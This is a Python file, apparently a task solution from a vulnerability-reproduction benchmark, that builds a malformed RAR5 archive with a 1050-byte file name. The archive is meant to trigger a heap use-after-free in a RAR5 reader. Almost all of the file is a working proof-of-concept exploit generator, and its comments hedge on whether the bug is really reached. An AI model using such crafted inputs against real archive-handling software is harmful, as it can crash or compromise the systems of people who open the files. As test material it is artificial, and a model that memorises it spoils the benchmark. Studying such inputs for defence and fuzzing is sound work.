import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Rar5 reader.
        The vulnerability occurs because the name size is read and allocated before being checked against the maximum allowed size.
        """
        # RAR5 Signature
        sig = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        def to_vint(n):
            out = bytearray()
            while n >= 0x80:
                out.append((n & 0x7f) | 0x80)
                n >>= 7
            out.append(n)
            return bytes(out)

        def make_block(type_val, flags_val, body_bytes):
            # Generic Header: [CRC32] [Size] [Type] [Flags] [Extra?] [Data?] [Body]
            # CRC is calculated over fields after CRC field (Size + Type + Flags + ...)
            
            # Construct data starting from Type
            h_data = bytearray()
            h_data.extend(to_vint(type_val))
            h_data.extend(to_vint(flags_val))
            # Extra/Data size omitted as flags are 0
            h_data.extend(body_bytes)
            
            size_vint = to_vint(len(h_data))
            
            to_crc = size_vint + h_data
            crc = zlib.crc32(to_crc) & 0xFFFFFFFF
            return struct.pack("<I", crc) + to_crc

        # 1. Main Header
        # Type 1, Flags 0
        mh_body = to_vint(0) # Archive Flags
        mh_block = make_block(1, 0, mh_body)
        
        # 2. File Header
        # Type 2, Flags 0
        # Body: FileFlags, UnpSize, Attr, CompInfo, HostOS, NameSize, Name
        
        # Based on ground truth ~1089 bytes and the vulnerability description,
        # we construct a valid RAR5 file with a File Header containing a large name.
        # The name size is checked only after allocation/read.
        # We provide enough bytes to satisfy the read, triggering the late check and potential UAF in error path.
        
        name_len = 1050
        name = b"A" * name_len
        
        fh_body = bytearray()
        fh_body.extend(to_vint(0)) # File Flags
        fh_body.extend(to_vint(0)) # Unpacked Size
        fh_body.extend(to_vint(0)) # Attributes
        fh_body.extend(to_vint(0)) # Compression Info
        fh_body.extend(to_vint(0)) # Host OS
        fh_body.extend(to_vint(name_len))
        fh_body.extend(name)
        
        fh_block = make_block(2, 0, fh_body)
        
        return sig + mh_block + fh_block
